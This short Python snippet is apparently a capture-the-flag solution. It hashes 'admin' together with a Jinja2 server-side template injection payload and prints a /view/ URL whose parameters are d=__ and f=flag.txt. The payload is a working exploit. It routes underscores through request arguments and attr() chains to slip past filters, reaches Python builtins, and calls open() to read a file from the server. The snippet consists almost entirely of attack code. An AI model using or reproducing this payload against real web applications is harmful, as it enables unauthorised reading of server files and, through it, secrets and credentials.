import hashlib

print(hashlib.sha256(('admin'+'{%with a=request|attr("args")|attr("get")("d"),b=request|attr("args")|attr("get")("f")%}{%print(request|attr("application")|attr(a~"globals"~a)|attr(a~"getitem"~a)(a~"builtins"~a)|attr(a~"getitem"~a)("open")(b)|attr("read")())%}{%endwith%}').encode()).hexdigest())
#/view/e5c478f7e0ea9f7e6dc8bcd722a3c93c4d849397b2e8c25ff283b95a8aa1eaa7?d=__&f=flag.txt